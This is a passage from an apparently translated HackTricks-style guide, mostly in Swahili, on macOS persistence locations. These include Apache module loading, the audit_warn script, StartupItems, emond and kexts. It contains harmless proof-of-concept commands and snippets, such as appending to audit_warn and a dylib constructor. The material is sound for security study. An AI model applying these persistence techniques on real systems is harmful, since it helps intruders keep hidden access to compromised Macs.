- Inatumika kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na apache inahitaji kuwa inafanya kazi
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd haina entitlements

#### Location

- **`/etc/apache2/httpd.conf`**
- Inahitajika root
- Trigger: Wakati Apache2 inaanza

#### Description & Exploit

Unaweza kuashiria katika `/etc/apache2/httpd.conf` ili kupakia moduli kwa kuongeza mstari kama:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Kwa njia hii, moduli zako zilizokusanywa zitawekwa na Apache. Jambo pekee ni kwamba unahitaji **kuisaini na cheti halali cha Apple**, au unahitaji **kuongeza cheti kipya kinachotambulika** katika mfumo na **kuiandika** nayo.

Kisha, ikiwa inahitajika, ili kuhakikisha seva itaanza unaweza kutekeleza:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Mfano wa msimbo kwa Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Inatumika kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root, auditd iwe inafanya kazi na kusababisha onyo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
- Root inahitajika
- **Trigger**: Wakati auditd inagundua onyo

#### Description & Exploit

Wakati wowote auditd inagundua onyo, script **`/etc/security/audit_warn`** in **atekelezwa**. Hivyo unaweza kuongeza payload yako juu yake.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Hii imepitwa na wakati, hivyo hakuna kitu kinapaswa kupatikana katika hizo directories.**

The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:

1. An **rc script**: A shell script executed at startup.
2. A **plist file**, specifically named `StartupParameters.plist`, which contains various configuration settings.

Ensure that both the rc script and the `StartupParameters.plist` file are correctly placed inside the **StartupItem** directory for the startup process to recognize and utilize them.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Siwezi kupata sehemu hii katika macOS yangu hivyo kwa maelezo zaidi angalia andiko

Andiko: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Iliyoanzishwa na Apple, **emond** ni mekanizma ya kurekodi ambayo inaonekana kuwa haijakamilika au labda imeachwa, lakini bado inapatikana. Ingawa si ya manufaa sana kwa msimamizi wa Mac, huduma hii isiyo na majina inaweza kutumika kama njia ya kudumu kwa wahalifu wa mtandao, ambayo huenda ikakosa kuonekana na wasimamizi wengi wa macOS.

Kwa wale wanaojua kuhusu uwepo wake, kubaini matumizi yoyote mabaya ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa huduma hii inatafuta skripti za kutekeleza katika saraka moja. Ili kuchunguza hili, amri ifuatayo inaweza kutumika:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Location

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Inahitaji root
- **Trigger**: Pamoja na XQuartz

#### Description & Exploit

XQuartz **haiwezi tena kufungwa katika macOS**, hivyo ikiwa unataka maelezo zaidi angalia andiko.

### ~~kext~~

> [!CAUTION]
> Ni ngumu sana kufunga kext hata kama ni root hivyo sitazingatia hii kutoroka kutoka kwenye sandboxes au hata kwa kudumu (isipokuwa una exploit)

#### Location

Ili kufunga KEXT kama kipengele cha kuanzisha, inahitaji **kufungwa katika moja ya maeneo yafuatayo**:

- `/System/Library/Extensions`
- Faili za KEXT zilizojengwa ndani ya mfumo wa uendeshaji wa OS X.
- `/Library/Extensions`
- Faili za KEXT zilizofungwa na programu za upande wa tatu

Unaweza kuorodhesha faili za kext zilizopakiwa kwa sasa na:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Kwa maelezo zaidi kuhusu [**kernel extensions angalia sehemu hii**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Andiko: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Mahali

- **`/usr/local/bin/amstoold`**
- Inahitajika Root

#### Maelezo & Ukatili

Kwa wazi `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii wakati ikifichua huduma ya XPC... jambo ni kwamba binary hiyo haikuwepo, hivyo unaweza kuweka kitu hapo na wakati huduma ya XPC itakapoitwa binary yako itaitwa.

Siwezi tena kuipata hii katika macOS yangu.

### ~~xsanctl~~

Andiko: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Mahali

- **`/Library/Preferences/Xsan/.xsanrc`**
- Inahitajika Root
- **Kichocheo**: Wakati huduma inapoendeshwa (nadra)

#### Maelezo & ukatili

Kwa wazi si kawaida sana kuendesha script hii na sikuweza hata kuipata katika macOS yangu, hivyo ikiwa unataka maelezo zaidi angalia andiko.

### ~~/etc/rc.common~~

> [!CAUTION] > **Hii haifanyi kazi katika toleo za kisasa za MacOS**

Pia inawezekana kuweka hapa **amri ambazo zitatekelezwa wakati wa kuanzisha.** Mfano wa script ya kawaida ya rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Mbinu na zana za kudumu

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
